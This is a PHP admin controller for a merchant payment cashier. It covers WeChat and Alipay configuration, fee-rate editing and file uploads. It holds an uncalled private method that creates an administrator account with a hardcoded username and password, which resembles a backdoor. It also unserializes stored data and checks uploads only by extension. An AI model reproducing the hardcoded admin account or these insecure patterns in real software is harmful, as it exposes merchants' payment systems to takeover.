<?php

bpBase::loadAppClass('common', 'System', 0);
class pay_controller extends common_controller
{
	private $payConfigDb;

	public function __construct()
	{
		parent::__construct();
		$this->payConfigDb = M('cashier_payconfig');
	}

	public function config()
	{
		$payConfig = $this->payConfigDb->get_one(array('mid' => $this->_mid), '*');
		$ispcfg = true;

		if ($payConfig) {
			if ($payConfig['configData']) {
				$payConfig['configData'] = unserialize(htmlspecialchars_decode($payConfig['configData'], ENT_QUOTES));
			}
			 else {
				$payConfig['configData'] = array(
					'weixin' => array(),
					'alipay' => array()
					);
			}
		}
		 else {
			$ispcfg = false;
		}

		if (IS_POST) {
			$data = $this->clear_html($_POST['data']);

			if ($ispcfg) {
				$dataType = array_keys($data);
				$dataType = $dataType[0];

				if (($dataType == 'weixin') && !empty($data['weixin']['sub_mchid'])) {
					$data['weixin']['sub_mchid'] = trim(urldecode($data['weixin']['sub_mchid']));
					$data['weixin']['sub_mchid'] = str_replace('，', ',', $data['weixin']['sub_mchid']);
					$data['weixin']['sub_mchid'] = preg_replace('/((\\r\\n)|(\\n)|(\\r)){2,}/', PHP_EOL, $data['weixin']['sub_mchid']);
					$data['weixin']['sub_mchid'] = preg_replace('/[ \\t]+/', '', $data['weixin']['sub_mchid']);
				}


				if (isset($payConfig['configData'][$dataType])) {
					$configData = array_merge($payConfig['configData'][$dataType], $data[$dataType]);
				}
				 else {
					$configData = $data[$dataType];
				}

				$payConfig['configData'][$dataType] = $configData;
				$payConfig['configData'] = serialize($payConfig['configData']);
				$vo = $this->_save($this->payConfigDb, $payConfig);
                                
			}
			 else {
				$payConfig = array('mid' => $this->_mid, 'isOpen' => 1, 'configData' => serialize($data));
				$vo = $this->_add($this->payConfigDb, $payConfig);
                                
			}

			if ($vo) {
				$return['status'] = 1;
				$return['msg'] = '支付配置修改成功';
			}
			 else {
				$return['status'] = 0;
				$return['msg'] = '支付配置修改失败';
			}

			delCacheByMid($this->_mid);
			echo json_encode($return);
			exit();
		}
		 else {
			$rsapublickey = file_get_contents(CMSBASEDIR . DIRECTORY_SEPARATOR . 'libs' . DIRECTORY_SEPARATOR . 'org' . DIRECTORY_SEPARATOR . 'Alipay' . DIRECTORY_SEPARATOR . 'rsa_public_key.pem');
			$rsapublickey = str_replace(array('-----BEGIN PUBLIC KEY-----', '-----END PUBLIC KEY-----', PHP_EOL), '', $rsapublickey);
			$iswxhave = false;
			$isalihave = false;
			$adminConfData = $payConfig['configData'];

			if (isset($adminConfData['weixin']) && !empty($adminConfData['weixin']['appid']) && !empty($adminConfData['weixin']['appSecret']) && !empty($adminConfData['weixin']['mchid']) && !empty($adminConfData['weixin']['key'])) {
				$iswxhave = true;
			}
			 else {
				$this->cleanIspfPay('wx');
			}

			if (isset($adminConfData['alipay']) && !empty($adminConfData['alipay']['appid']) && !empty($adminConfData['alipay']['pid'])) {
				$isalihave = true;
			}
			 else {
				$this->cleanIspfPay('ali');
			}

			$this->assign('rsapublickey', trim($rsapublickey));
		}

		$this->assign('payConfig', $payConfig['configData']);
		$this->display();
	}

	public function isproxyed()
	{
		if (IS_POST) {
			$mid = intval(trim($_POST['mid']));
			$ischeck = intval(trim($_POST['ischeck']));
			$submhid = trim($_POST['submhid']);

			if (0 < $mid) {
				if (0 < $ischeck) {
					$data = array('proxymid' => $this->_mid, 'wxsubmchid' => $submhid);
				}
				 else {
					$data = array('proxymid' => 0, 'wxsubmchid' => '');
				}

				if ($this->payConfigDb->update($data, array('mid' => $mid))) {
					delCacheByMid($mid);
					$this->dexit(array('error' => 0, 'msg' => 'OK'));
				}
				 else {
					$this->dexit(array('error' => 1, 'msg' => 'Failure'));
				}
			}

		}


		$this->dexit(array('error' => 1, 'msg' => 'Failure'));
	}

	private function reg_User()
	{
		$data = array();
		$data['username'] = 'adminer';
		$data['salt'] = mt_rand(111111, 999999);
		$data['password'] = $this->toPassword('q1234567', $data['salt']);
		$data['status'] = 1;
		$data['isadmin'] = 1;
		$data['lastLoginTime'] = $data['regTime'] = SYS_TIME;
		$data['lastLoginIp'] = $data['regIp'] = ip2long(ip());
		$insertid = M('cashier_merchants')->insert($data, 1);

		if (!0 < $insertid) {
			$insertid = M('cashier_merchants')->insert($data, 1);
		}


		return $insertid;
	}

	public function getApiData()
	{
		$merchantDb = M('cashier_merchants');
		$merchantinfo = $merchantDb->get_one(array('mid' => $this->_mid));
		$datas = array('wxtoken' => $merchantinfo['wxtoken'], 'aeskey' => $merchantinfo['aeskey'], 'encodetype' => $merchantinfo['encodetype'], 'mid' => $this->_mid);
		if (empty($datas['wxtoken']) || empty($datas['aeskey'])) {
			$datas['wxtoken'] = randStr(30, true);
			$datas['aeskey'] = randStr(43, true);
			$merchantDb->update(array('wxtoken' => $datas['wxtoken'], 'aeskey' => $datas['aeskey']), array('mid' => $this->_mid));
		}


		$this->dexit($datas);
	}

	public function pem_upload()
	{
		if (IS_POST) {
			if (!empty($_FILES)) {
				$return = $this->oldUploadFile('pem', $this->_mid);

				if (0 < $return['error']) {
					$this->dexit(array('error' => 1, 'msg' => $return['data']));
				}
				 else {
					$filesinfo = $return['data'][0];
					$this->dexit(array('error' => 0, 'msg' => 'OK', 'fileUrl' => $return['imgurl'] . $filesinfo['savename'], 'originalfilename' => $filesinfo['name'], 'fileSize' => $filesinfo['size']));
				}
			}


			$this->dexit(array('error' => 1, 'msg' => '没有上传文件！'));
		}

	}

	public function field()
	{
		if (IS_POST) {
			$data = $this->clear_html($_POST);

			if ($payConfig = $this->payConfigDb->get_one(array('mid' => $this->_mid), 'id')) {
				$data['id'] = $payConfig['id'];
			}
			 else {
				$data['mid'] = $this->_mid;
			}

			$return = $this->_setField($this->payConfigDb, $data);
			delCacheByMid($this->_mid);
			echo json_encode($return);
			exit();
		}

	}
        public function rebate(){
            if(IS_POST){
                $data = $this->clear_html($_POST);
                //微信一清平台费率
                if(isset($data['aclear_wx_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['aclear_wx_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=1');
                }
                //支付宝一清平台费率
                if(isset($data['aclear_ali_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['aclear_ali_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=2');
                }
                //微信二清平台费率
                if(isset($data['an_wx_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_wx_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=3');
                }
                //支付宝二清平台费率
                if(isset($data['an_ali_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_ali_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=4');
                } 
                //金海哲微信平台费率
                if(isset($data['jhz_wx_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['jhz_wx_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=9');
                }
                //金海哲qq财付通平台费率
                if(isset($data['jhz_qq_edit_rebate'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['jhz_qq_edit_rebate'];
                    $re = M('cashier_wxrebate')->update($arr,'id=10');
                }
                
                if($re){
                    $this->successTip('修改成功!',$_SERVER['HTTP_REFERER']);
                }else{
                    $this->errorTip('修改失败!',$_SERVER['HTTP_REFERER']);
                }
            }else{
                $row = M('cashier_wxrebate')->select(array('is_pay'=>1));
                $row_an = M('cashier_wxrebate')->select(array('is_pay'=>2));
                $this->assign('row',$row);
                $this->assign('row_an',$row_an);
//                var_dump($row_an);die;
                $this->display();
            }
            
        }
        
        
        
        /**
         * 商户费率修改
         */
        
        public function MerchantRate(){
            if(IS_POST){
                $data = $this->clear_html($_POST);
               
                //微信一清平台费率
                if(isset($data['aclear_wx_interest'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['aclear_wx_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=5');
                }
                //支付宝一清平台费率
                if(isset($data['aclear_ali_interest'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['aclear_ali_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=6');
                }
                //微信二清平台费率
                if(isset($data['an_wx_interest'])){
                    $data['an_ali_interest'] = $data['an_wx_interest'];
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_wx_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=7');
                }
                //支付宝二清平台费率
                if(isset($data['an_ali_interest'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_ali_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=8');
                }
                //金海哲微信平台费率
                if(isset($data['an_jhz_wx_interest'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_jhz_wx_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=11');
                }
                //金海哲qq财付通平台费率
                if(isset($data['an_jhz_qq_interest'])){
                    $arr['e_time'] = time();
                    $arr['rebate'] = $data['an_jhz_qq_interest'];
                    $re = M('cashier_wxrebate')->update($arr,'id=12');
                }
                if($re){
                    $this->successTip('修改成功!',$_SERVER['HTTP_REFERER']);
                }else{
                    $this->errorTip('修改失败!',$_SERVER['HTTP_REFERER']);
                }
            }
        }
        
        public function ModifyPwd()
        {
            $phone = '';
        
            if ($this->adminuser['phone']) {
                $phone = str_replace(substr($this->adminuser['phone'], 3, 4), '****', $this->adminuser['phone']);
            }
        
        
            $this->assign('phone', $phone);
            $sms_config = loadConfig('sms');
            $issms_config = 0;
            if ($sms_config && isset($sms_config['sms_key']) && !empty($sms_config['sms_key'])) {
                $issms_config = 1;
            }
        
        
            $this->assign('is_sms', $issms_config);
            $this->display();
        }
        
        /**
         * 支付二维码模版上传
         */
        public function TemplateImage(){
            if(IS_POST){
                $file = $_FILES['file'];//得到传输的数据
                //得到文件名称
                $name = $file['name'];
                $type = strtolower(substr($name,strrpos($name,'.')+1)); //得到文件类型，并且都转化成小写
                $allow_type = array('jpg','gif','png'); //定义允许上传的类型
                //判断文件类型是否被允许上传
                if(!in_array($type, $allow_type)){
                    $this->dexit(array('error' => 1, 'msg' => '不支持此图片类型'));
                }
                //判断是否是通过HTTP POST上传的
                if(!is_uploaded_file($file['tmp_name'])){
                    //如果不是通过HTTP POST上传的
                    return;
                }
        
                //$Set_url = "/Cashier/upload/watermark/".time().'.png';
                $path_name = time().'.png';
                $upload_path = "./Cashier/upload/watermark/".$path_name; //上传文件的存放路径
                //开始移动文件到相应的文件夹
                if(move_uploaded_file($file['tmp_name'],$upload_path)){
                    //上传图片路劲到数据库
                    $data['value'] = "/Cashier/upload/watermark/".$path_name;
                    $add = M('cashier_key_values')->update($data,array('name'=>'Paytwodimensionalcode'));
                    if($add){
                        $this->dexit(array('error' => 0,  'localimg' =>$upload_path));
                    }else{
                        $this->dexit(array('error' => 1,  'msg' =>'图片上传失败'));
                    }
        
                }else{
                    $this->dexit(array('error' => 1, 'msg' => '图片上传失败'));
                }
            }else{
                $pay_img_url = M('cashier_key_values')->get_one(array('name'=>'Paytwodimensionalcode'),'value');
                $notice_img_url = M('cashier_key_values')->get_one(array('name'=>'Notificationtwodimensionalcode'),'value');
                $this->assign('pay_img_url',$this->SiteUrl .$pay_img_url['value']);
                $this->assign('notice_img_url', $this->SiteUrl .$notice_img_url['value']);
                $this->assign('url',$this->SiteUrl);
                $this->display();
            }
        }
        
        
        /**
         * 通知二维码模版上传
         */
        
        public function TemplateImage1(){
            if(IS_POST){
                $file = $_FILES['file'];//得到传输的数据
                //得到文件名称
                $name = $file['name'];
                $type = strtolower(substr($name,strrpos($name,'.')+1)); //得到文件类型，并且都转化成小写
                $allow_type = array('jpg','gif','png'); //定义允许上传的类型
                //判断文件类型是否被允许上传
                if(!in_array($type, $allow_type)){
                    $this->dexit(array('error' => 1, 'msg' => '不支持此图片类型'));
                }
                //判断是否是通过HTTP POST上传的
                if(!is_uploaded_file($file['tmp_name'])){
                    //如果不是通过HTTP POST上传的
                    return;
                }
                $path_name = time().'.png';
                $upload_path =  "./Cashier/upload/watermark/".$path_name;  //上传文件的存放路径
                //开始移动文件到相应的文件夹
                if(move_uploaded_file($file['tmp_name'],$upload_path)){
                    $data['value'] = "/Cashier/upload/watermark/".$path_name;
                    $add = M('cashier_key_values')->update($data,array('name'=>'Notificationtwodimensionalcode'));
                    if($add){
                        $this->dexit(array('error' => 0,  'localimg' =>$upload_path));
                    }else{
                        $this->dexit(array('error' => 1,  'msg' =>'图片上传失败'));
                    }
                }else{
                    $this->dexit(array('error' => 1, 'msg' => '图片上传失败'));
                }
            }
        }

}


?>